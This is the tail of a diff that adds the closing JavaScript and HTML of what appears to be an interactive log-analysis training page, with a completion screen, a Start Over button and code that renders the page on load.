+    window.scrollTo({top:0, behavior:'smooth'});
+  } else {
+    showFinalScreen();
+  }
+}
+
+function showFinalScreen(){
+  const area = document.getElementById('content');
+  area.innerHTML = `
+    <div style="text-align:center;padding:50px 20px;">
+      <div style="width:80px;height:80px;border-radius:50%;background:var(--accent-dim);border:2px solid var(--accent-mid);display:inline-flex;align-items:center;justify-content:center;font-size:2rem;color:var(--accent);margin-bottom:24px;">
+        <i class="fas fa-flag-checkered"></i>
+      </div>
+      <h1 style="font-size:2rem;color:var(--fg-bright);margin-bottom:12px;">All Log Modules Complete!</h1>
+      <p style="color:var(--fg-dim);max-width:600px;margin:0 auto 32px;line-height:1.7;">
+        You've successfully learned how to extract and analyze Windows, Linux, Network, Web, Cloud, and SIEM logs to detect real-world attacks.
+      </p>
+      <button class="btn primary" onclick="currentLab=0;currentTask=0;renderSidebar();renderLab();">
+        <i class="fas fa-rotate-left"></i> Start Over
+      </button>
+    </div>
+  `;
+}
+
+document.addEventListener('DOMContentLoaded', ()=>{
+  renderSidebar();
+  renderLab();
+});
+</script>
+</body>
+</html>
